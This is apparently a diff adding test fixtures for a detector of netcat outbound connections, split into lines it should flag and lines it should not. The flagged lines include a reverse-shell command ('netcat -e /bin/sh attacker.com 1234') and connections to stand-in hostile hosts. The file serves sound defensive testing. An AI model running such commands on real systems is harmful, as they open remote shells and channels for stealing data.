@@ -1,0 +1,14 @@
+# EX-005: Netcat outbound connection
+# Test cases for snapshot testing
+
+# === Cases that SHOULD be detected ===
+nc evil.com 4444
+netcat -e /bin/sh attacker.com 1234
+nc -v malicious.org 8080
+netcat remote.server.com 9999
+
+# === Cases that should NOT be detected ===
+nc -l 8080
+nc localhost 3000
+nc 127.0.0.1 4444
+nc -l -p 8888
